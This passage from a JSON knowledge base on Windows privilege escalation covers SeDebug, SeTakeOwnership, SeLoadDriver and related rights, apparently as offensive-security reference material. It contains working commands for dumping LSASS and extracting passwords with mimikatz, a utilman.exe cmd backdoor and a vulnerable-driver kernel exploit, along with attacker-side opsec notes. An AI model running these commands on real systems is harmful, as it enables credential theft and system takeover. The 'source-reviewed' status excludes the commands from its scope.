    "description": "SeDebugPrivilege corresponds to the Windows Debug programs user right. Microsoft describes it as relevant to debugging system components. A process's access token records its user identity, groups and privileges as distinct information. A debugging privilege and an account identity therefore need separate descriptions.",
    "tools": [
      {
        "name": "mimikatz",
        "url": "https://github.com/gentilkiwi/mimikatz"
      },
      {
        "name": "ProcDump (Sysinternals)",
        "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
      }
    ],
    "commands": [
      {
        "label": "comsvcs MiniDump (LOLBAS)",
        "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full",
        "lang": "cmd"
      },
      {
        "label": "Parse offline with mimikatz",
        "code": "sekurlsa::minidump C:\\Temp\\lsass.dmp\nsekurlsa::logonpasswords",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1134.001",
      "url": "https://attack.mitre.org/techniques/T1134/001/"
    },
    "references": [
      {
        "label": "Microsoft — Debug programs (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "kind": "primary"
      },
      {
        "label": "LOLBAS, comsvcs.dll",
        "url": "https://lolbas-project.github.io/lolbas/Libraries/comsvcs/"
      },
      {
        "label": "MITRE T1003.001, LSASS Memory (the dump path)",
        "url": "https://attack.mitre.org/techniques/T1003/001/"
      }
    ],
    "requires": [
      "SeDebugPrivilege (effectively admin/SYSTEM-equivalent)"
    ],
    "opsec": "LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.",
        "commands": [
          {
            "code": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <lsass_pid> C:\\Temp\\lsass.dmp full",
            "label": "comsvcs MiniDump (LOLBAS)",
            "lang": "cmd"
          },
          {
            "code": "sekurlsa::minidump C:\\Temp\\lsass.dmp\nsekurlsa::logonpasswords",
            "label": "Parse offline with mimikatz",
            "lang": "cmd"
          }
        ],
        "description": "SeDebugPrivilege corresponds to the Windows Debug programs user right. Microsoft describes it as relevant to debugging system components. A process's access token records its user identity, groups and privileges as distinct information. A debugging privilege and an account identity therefore need separate descriptions.",
        "id": "pe-sedebug-lsass",
        "label": "SeDebug",
        "mitre": {
          "id": "T1134.001",
          "url": "https://attack.mitre.org/techniques/T1134/001/"
        },
        "opsec": "LSASS handle opens (esp. by rundll32/procdump) are top-tier EDR detections.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Debug programs (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Access Tokens",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "label": "LOLBAS, comsvcs.dll",
            "url": "https://lolbas-project.github.io/lolbas/Libraries/comsvcs/"
          },
          {
            "label": "MITRE T1003.001, LSASS Memory (the dump path)",
            "url": "https://attack.mitre.org/techniques/T1003/001/"
          }
        ],
        "requires": [
          "SeDebugPrivilege (effectively admin/SYSTEM-equivalent)"
        ],
        "summary": "Understand debugging privileges and process security context.",
        "tools": [
          {
            "name": "mimikatz",
            "url": "https://github.com/gentilkiwi/mimikatz"
          },
          {
            "name": "ProcDump (Sysinternals)",
            "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
          }
        ]
      },
      "claims": [
        {
          "text": "Microsoft identifies Debug programs as the SeDebugPrivilege user right and describes its use when debugging system components.",
          "section": "Microsoft — Debug programs (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/debug-programs"
          ]
        },
        {
          "text": "A Windows access token contains the user SID, group SIDs and a list of privileges.",
          "section": "Microsoft — Access Tokens — Access token contents",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-setakeownership",
    "label": "SeTakeOwnership",
    "phase": "hold",
    "summary": "Understand object ownership and its security descriptor.",
    "affects": "All supported Windows versions (privilege model).",
    "description": "SeTakeOwnershipPrivilege corresponds to the Windows user right for taking ownership of securable objects. A security descriptor can record an object's owner together with discretionary and system access-control lists. The owner field and the access-control lists are distinct parts of that security information.",
    "tools": [
      {
        "name": "takeown (built-in)",
        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown"
      },
      {
        "name": "icacls (built-in)",
        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
      }
    ],
    "commands": [
      {
        "label": "Take ownership + grant write",
        "code": "takeown /f C:\\Windows\\System32\\utilman.exe\nicacls C:\\Windows\\System32\\utilman.exe /grant \"%USERNAME%\":F",
        "lang": "cmd"
      },
      {
        "label": "Replace with cmd, trigger at lock screen",
        "code": "copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1546.008",
      "url": "https://attack.mitre.org/techniques/T1546/008/"
    },
    "references": [
      {
        "label": "Microsoft — Take ownership of files or other objects (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Security Descriptors",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Abusing Tokens",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
      }
    ],
    "requires": [
      "SeTakeOwnershipPrivilege",
      "Ability to reach the logon screen (for the utilman/sethc trigger)"
    ],
    "opsec": "Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (privilege model).",
        "commands": [
          {
            "code": "takeown /f C:\\Windows\\System32\\utilman.exe\nicacls C:\\Windows\\System32\\utilman.exe /grant \"%USERNAME%\":F",
            "label": "Take ownership + grant write",
            "lang": "cmd"
          },
          {
            "code": "copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe",
            "label": "Replace with cmd, trigger at lock screen",
            "lang": "cmd"
          }
        ],
        "description": "SeTakeOwnershipPrivilege corresponds to the Windows user right for taking ownership of securable objects. A security descriptor can record an object's owner together with discretionary and system access-control lists. The owner field and the access-control lists are distinct parts of that security information.",
        "id": "pe-setakeownership",
        "label": "SeTakeOwnership",
        "mitre": {
          "id": "T1546.008",
          "url": "https://attack.mitre.org/techniques/T1546/008/"
        },
        "opsec": "Replacing utilman.exe / sethc.exe is a well-known IOC. Back up and restore the original to avoid breaking accessibility.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Take ownership of files or other objects (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Security Descriptors",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors"
          },
          {
            "label": "HackTricks, Abusing Tokens",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
          }
        ],
        "requires": [
          "SeTakeOwnershipPrivilege",
          "Ability to reach the logon screen (for the utilman/sethc trigger)"
        ],
        "summary": "Understand object ownership and its security descriptor.",
        "tools": [
          {
            "name": "takeown (built-in)",
            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/takeown"
          },
          {
            "name": "icacls (built-in)",
            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls"
          }
        ]
      },
      "claims": [
        {
          "text": "The Take ownership of files or other objects user right corresponds to SeTakeOwnershipPrivilege.",
          "section": "Microsoft — Take ownership of files or other objects (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects"
          ]
        },
        {
          "text": "A Windows security descriptor can record owner and group SIDs, a discretionary access-control list and a system access-control list.",
          "section": "Microsoft — Security Descriptors — Opening definition and security-information list",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptors"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-seloaddriver",
    "label": "SeLoadDriver",
    "phase": "hold",
    "summary": "Distinguish driver-loading permission from code-signing policy.",
    "affects": "All versions if held. The Microsoft driver-blocklist is default-on only from Windows 11 22H2; elsewhere (stock Windows 10, Server 2022) it depends on HVCI/memory-integrity being enabled, and without it blocklisted drivers like Capcom.sys still load. Where active, HVCI and the blocklist block most vulnerable drivers.",
    "description": "SeLoadDriverPrivilege is associated with dynamically loading and unloading device drivers. Windows separately documents digital-signature requirements for kernel-mode drivers. The user right and the signature requirements describe different parts of driver security; a privilege name alone is not a description of the complete driver policy.",
    "tools": [
      {
        "name": "EoPLoadDriver",
        "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
      },
      {
        "name": "ExploitCapcom",
        "url": "https://github.com/tandasat/ExploitCapcom"
      }
    ],
    "commands": [
      {
        "label": "Register + load the driver",
        "code": "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys",
        "lang": "cmd"
      },
      {
        "label": "Exploit the loaded driver for kernel exec -> SYSTEM",
        "code": "ExploitCapcom.exe",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1068",
      "url": "https://attack.mitre.org/techniques/T1068/"
    },
    "references": [
      {
        "label": "Microsoft — Load and unload device drivers (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Kernel-Mode Code Signing Requirements",
        "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-requirements--windows-vista-and-later-",
        "kind": "primary"
      },
      {
        "label": "Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation",
        "url": "https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/"
      },
      {
        "label": "Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)",
        "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
      }
    ],
    "requires": [
      "SeLoadDriverPrivilege (held by e.g. Print Operators)"
    ],
    "opsec": "Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All versions if held. The Microsoft driver-blocklist is default-on only from Windows 11 22H2; elsewhere (stock Windows 10, Server 2022) it depends on HVCI/memory-integrity being enabled, and without it blocklisted drivers like Capcom.sys still load. Where active, HVCI and the blocklist block most vulnerable drivers.",
        "commands": [
          {
            "code": "EoPLoadDriver.exe System\\CurrentControlSet\\MyService C:\\Temp\\Capcom.sys",
            "label": "Register + load the driver",
            "lang": "cmd"
          },
          {
            "code": "ExploitCapcom.exe",
            "label": "Exploit the loaded driver for kernel exec -> SYSTEM",
            "lang": "cmd"
          }
        ],
        "description": "SeLoadDriverPrivilege is associated with dynamically loading and unloading device drivers. Windows separately documents digital-signature requirements for kernel-mode drivers. The user right and the signature requirements describe different parts of driver security; a privilege name alone is not a description of the complete driver policy.",
        "id": "pe-seloaddriver",
        "label": "SeLoadDriver",
        "mitre": {
          "id": "T1068",
          "url": "https://attack.mitre.org/techniques/T1068/"
        },
        "opsec": "Loading a known-vulnerable driver is heavily flagged; modern Windows + HVCI / driver blocklist may refuse the load.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Load and unload device drivers (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Kernel-Mode Code Signing Requirements",
            "url": "https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-requirements--windows-vista-and-later-"
          },
          {
            "label": "Tarlogic, Abusing SeLoadDriverPrivilege for privilege escalation",
            "url": "https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/"
          },
          {
            "label": "Tarlogic, EoPLoadDriver (SeLoadDriverPrivilege abuse)",
            "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
          }
        ],
        "requires": [
          "SeLoadDriverPrivilege (held by e.g. Print Operators)"
        ],
        "summary": "Distinguish driver-loading permission from code-signing policy.",
        "tools": [
          {
            "name": "EoPLoadDriver",
            "url": "https://github.com/TarlogicSecurity/EoPLoadDriver"
          },
          {
            "name": "ExploitCapcom",
            "url": "https://github.com/tandasat/ExploitCapcom"
          }
        ]
      },
      "claims": [
        {
          "text": "SeLoadDriverPrivilege corresponds to the user right for dynamically loading and unloading device drivers.",
          "section": "Microsoft — Load and unload device drivers (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers"
          ]
        },
        {
          "text": "Microsoft documents digital-signature requirements for kernel-mode drivers.",
          "section": "Microsoft — Kernel-Mode Code Signing Requirements — Opening signing requirements and policy sections",
          "sources": [
            "https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-requirements--windows-vista-and-later-"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-semanagevolume",
    "label": "SeManageVolume",
    "phase": "hold",
    "summary": "Understand the user right for volume-maintenance tasks.",
    "affects": "All supported Windows versions (privilege model).",
    "description": "SeManageVolumePrivilege corresponds to Perform volume maintenance tasks. The Microsoft policy reference describes volume and disk management, including volume creation or removal and defragmentation. Windows privileges are local to a computer; the same domain account can have different privilege assignments on different computers.",
    "tools": [
      {
        "name": "SeManageVolumeExploit",
        "url": "https://github.com/CsEnox/SeManageVolumeExploit"
      }
    ],
    "commands": [
      {
        "label": "Grant write over C:\\ (then DLL hijack)",
        "code": "SeManageVolumeExploit.exe",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1574.001",
      "url": "https://attack.mitre.org/techniques/T1574/001/"
    },
    "references": [
      {
        "label": "Microsoft — Perform volume maintenance tasks (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Privileges",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges",
        "kind": "primary"
      },
      {
        "label": "gtworek, PSBits FSCTL_SD_GLOBAL_CHANGE PoC",
        "url": "https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c"
      }
    ],
    "requires": [
      "SeManageVolumePrivilege",
      "A SYSTEM process that loads a writable/missing DLL to trigger"
    ],
    "opsec": "Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32). The exploit re-ACLs C:\\ to grant the Users group (every local user) full control, a persistent, drive-wide DACL change that is a durable IOC and a security downgrade left behind; revert it afterward.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (privilege model).",
        "commands": [
          {
            "code": "SeManageVolumeExploit.exe",
            "label": "Grant write over C:\\ (then DLL hijack)",
            "lang": "cmd"
          }
        ],
        "description": "SeManageVolumePrivilege corresponds to Perform volume maintenance tasks. The Microsoft policy reference describes volume and disk management, including volume creation or removal and defragmentation. Windows privileges are local to a computer; the same domain account can have different privilege assignments on different computers.",
        "id": "pe-semanagevolume",
        "label": "SeManageVolume",
        "mitre": {
          "id": "T1574.001",
          "url": "https://attack.mitre.org/techniques/T1574/001/"
        },
        "opsec": "Writing a DLL into System32 and forcing a SYSTEM load is detectable (image-load + file-create in System32). The exploit re-ACLs C:\\ to grant the Users group (every local user) full control, a persistent, drive-wide DACL change that is a durable IOC and a security downgrade left behind; revert it afterward.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Perform volume maintenance tasks (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Privileges",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          },
          {
            "label": "gtworek, PSBits FSCTL_SD_GLOBAL_CHANGE PoC",
            "url": "https://github.com/gtworek/PSBits/blob/master/Misc/FSCTL_SD_GLOBAL_CHANGE.c"
          }
        ],
        "requires": [
          "SeManageVolumePrivilege",
          "A SYSTEM process that loads a writable/missing DLL to trigger"
        ],
        "summary": "Understand the user right for volume-maintenance tasks.",
        "tools": [
          {
            "name": "SeManageVolumeExploit",
            "url": "https://github.com/CsEnox/SeManageVolumeExploit"
          }
        ]
      },
      "claims": [
        {
          "text": "The SeManageVolumePrivilege policy reference covers volume and disk maintenance, including creating or removing volumes and defragmentation.",
          "section": "Microsoft — Perform volume maintenance tasks (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks"
          ]
        },
        {
          "text": "Windows privileges apply to the local computer, and a domain account can have different privileges on different computers.",
          "section": "Microsoft — Privileges — Local account database and access token scope",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-setrustedcredman",
    "label": "SeTrustedCredManAccess",
    "phase": "hold",
    "summary": "Understand Credential Manager's trusted-caller privilege.",
    "affects": "All supported Windows versions if the privilege is held (Winlogon and LSASS by default; rarely delegated).",
    "description": "SeTrustedCredManAccessPrivilege is the user right named Access Credential Manager as a trusted caller. Microsoft's archived policy reference associates this setting with Credential Manager backup and restoration. That reference recommends leaving the policy at its default. These statements describe the documented purpose and recommendation, without asserting a current account assignment.",
    "tools": [
      {
        "name": "forkatz",
        "url": "https://github.com/Barbarisch/forkatz"
      },
      {
        "name": "BackupCreds",
        "url": "https://github.com/leftp/BackupCreds"
      }
    ],
    "mitre": {
      "id": "T1555.004",
      "url": "https://attack.mitre.org/techniques/T1555/004/"
    },
    "references": [
      {
        "label": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller",
        "kind": "primary"
      },
      {
        "label": "Tyranid's Lair, Dumping Stored Credentials",
        "url": "https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html"
      }
    ],
    "requires": [
      "SeTrustedCredManAccessPrivilege in the token",
      "An elevated/local-admin context to borrow Winlogon's token (no unprivileged user holds this privilege directly)"
    ],
    "opsec": "Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions if the privilege is held (Winlogon and LSASS by default; rarely delegated).",
        "description": "SeTrustedCredManAccessPrivilege is the user right named Access Credential Manager as a trusted caller. Microsoft's archived policy reference associates this setting with Credential Manager backup and restoration. That reference recommends leaving the policy at its default. These statements describe the documented purpose and recommendation, without asserting a current account assignment.",
        "id": "pe-setrustedcredman",
        "label": "SeTrustedCredManAccess",
        "mitre": {
          "id": "T1555.004",
          "url": "https://attack.mitre.org/techniques/T1555/004/"
        },
        "opsec": "Rarely granted outside Winlogon; CredBackupCredentials while impersonating Winlogon is an unusual, detectable call sequence.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller"
          },
          {
            "label": "Tyranid's Lair, Dumping Stored Credentials",
            "url": "https://www.tiraniddo.dev/2021/05/dumping-stored-credentials-with.html"
          }
        ],
        "requires": [
          "SeTrustedCredManAccessPrivilege in the token",
          "An elevated/local-admin context to borrow Winlogon's token (no unprivileged user holds this privilege directly)"
        ],
        "summary": "Understand Credential Manager's trusted-caller privilege.",
        "tools": [
          {
            "name": "forkatz",
            "url": "https://github.com/Barbarisch/forkatz"
          },
          {
            "name": "BackupCreds",
            "url": "https://github.com/leftp/BackupCreds"
          }
        ]
      },
      "claims": [
        {
          "text": "The archived Microsoft policy reference associates SeTrustedCredManAccessPrivilege with Credential Manager backup and restoration.",
          "section": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller"
          ]
        },
        {
          "text": "The archived Microsoft policy reference recommends leaving the trusted-caller policy at its default.",
          "section": "Microsoft — Access Credential Manager as a trusted caller (archived policy reference) — Best practices",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/access-credential-manager-as-a-trusted-caller"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-secreatetoken",
    "label": "SeCreateToken",
    "phase": "hold",
    "summary": "Understand token creation as a Windows security operation.",
    "affects": "All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).",
    "description": "SeCreateTokenPrivilege corresponds to the Create a token object user right. An access token describes the security context of a process or thread, including identity and privileges. The privilege associated with token creation and the security information represented by a token are separate concepts.",
    "tools": [
      {
        "name": "daem0nc0re / PrivFu (token-privilege PoCs)",
        "url": "https://github.com/daem0nc0re/PrivFu"
      },
      {
        "name": "Priv2Admin",
        "url": "https://github.com/gtworek/Priv2Admin"
      }
    ],
    "commands": [
      {
        "label": "Confirm the privilege",
        "code": "whoami /priv",
        "lang": "cmd"
      },
      {
        "label": "Forge an Administrators token, then impersonate it",
        "code": ":: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1134.003",
      "url": "https://attack.mitre.org/techniques/T1134/003/"
    },
    "references": [
      {
        "label": "Microsoft — Create a token object (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/create-a-token-object",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "kind": "primary"
      },
      {
        "label": "Abusing Token Privileges for LPE (ExploitDB 42556)",
        "url": "https://www.exploit-db.com/papers/42556"
      },
      {
        "label": "Priv2Admin, SeCreateTokenPrivilege",
        "url": "https://github.com/gtworek/Priv2Admin"
      }
    ],
    "requires": [
      "SeCreateTokenPrivilege in the token"
    ],
    "opsec": "A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions when the privilege is held (very rarely granted to a non-SYSTEM account).",
        "commands": [
          {
            "code": "whoami /priv",
            "label": "Confirm the privilege",
            "lang": "cmd"
          },
          {
            "code": ":: build and run the SeCreateTokenPrivilegePoC from daem0nc0re/PrivFu",
            "label": "Forge an Administrators token, then impersonate it",
            "lang": "cmd"
          }
        ],
        "description": "SeCreateTokenPrivilege corresponds to the Create a token object user right. An access token describes the security context of a process or thread, including identity and privileges. The privilege associated with token creation and the security information represented by a token are separate concepts.",
        "id": "pe-secreatetoken",
        "label": "SeCreateToken",
        "mitre": {
          "id": "T1134.003",
          "url": "https://attack.mitre.org/techniques/T1134/003/"
        },
        "opsec": "A process other than LSASS calling NtCreateToken, then impersonating a token carrying an added Administrators SID, is anomalous and detectable.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Create a token object (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/create-a-token-object"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Access Tokens",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "label": "Abusing Token Privileges for LPE (ExploitDB 42556)",
            "url": "https://www.exploit-db.com/papers/42556"
          },
          {
            "label": "Priv2Admin, SeCreateTokenPrivilege",
            "url": "https://github.com/gtworek/Priv2Admin"
          }
        ],
        "requires": [
          "SeCreateTokenPrivilege in the token"
        ],
        "summary": "Understand token creation as a Windows security operation.",
        "tools": [
          {
            "name": "daem0nc0re / PrivFu (token-privilege PoCs)",
            "url": "https://github.com/daem0nc0re/PrivFu"
          },
          {
            "name": "Priv2Admin",
            "url": "https://github.com/gtworek/Priv2Admin"
          }
        ]
      },
      "claims": [
        {
          "text": "SeCreateTokenPrivilege corresponds to the Create a token object user right.",
          "section": "Microsoft — Create a token object (archived policy reference) — Reference and constant name",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/create-a-token-object"
          ]
        },
        {
          "text": "An access token describes the security context of a Windows process or thread.",
          "section": "Microsoft — Access Tokens — Opening definition",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-setcb",
    "label": "SeTcb",
    "phase": "hold",
    "summary": "Understand the right associated with trusted authentication services.",
    "affects": "All supported Windows versions if the privilege is held (very rarely granted).",
    "description": "SeTcbPrivilege corresponds to Act as part of the operating system. Microsoft's archived policy reference describes low-level authentication services as the typical users of this right. A Windows access token represents user identity, groups and privileges separately; a privilege assignment should not be used as an account name.",
    "tools": [
      {
        "name": "gtworek PsBits (VirtualAccounts / TcbElevation)",
        "url": "https://github.com/gtworek/PSBits"
      }
    ],
    "commands": [
      {
        "label": "No off-the-shelf one-liner: requires custom code calling LsaLogonUser to make and impersonate a token",
        "code": ":: build and run a SeTcb LsaLogonUser PoC (gtworek PsBits)",
        "lang": "cmd"
      }
    ],
    "mitre": {
      "id": "T1134.003",
      "url": "https://attack.mitre.org/techniques/T1134/003/"
    },
    "references": [
      {
        "label": "Microsoft — Act as part of the operating system (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/act-as-part-of-the-operating-system",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "kind": "primary"
      },
      {
        "label": "Priv2Admin, Windows privilege abuse",
        "url": "https://github.com/gtworek/Priv2Admin"
      }
    ],
    "requires": [
      "SeTcbPrivilege in the token"
    ],
    "opsec": "Rarely granted; abnormal LSA logon calls are detectable.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
